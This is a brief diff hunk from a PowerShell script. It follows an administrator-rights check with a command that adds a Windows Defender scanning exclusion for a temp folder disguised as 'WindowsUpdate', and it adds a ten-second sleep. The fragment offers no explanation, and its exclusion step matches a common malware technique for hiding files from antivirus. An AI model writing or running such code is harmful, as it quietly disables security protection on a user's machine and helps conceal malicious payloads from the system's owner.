@@ -14,3 +14,4 @@ if (-not $isAdmin) {
 
 }
 Add-MpPreference -ExclusionPath "$env:TEMP\WindowsUpdate"
+Start-Sleep -Seconds 10
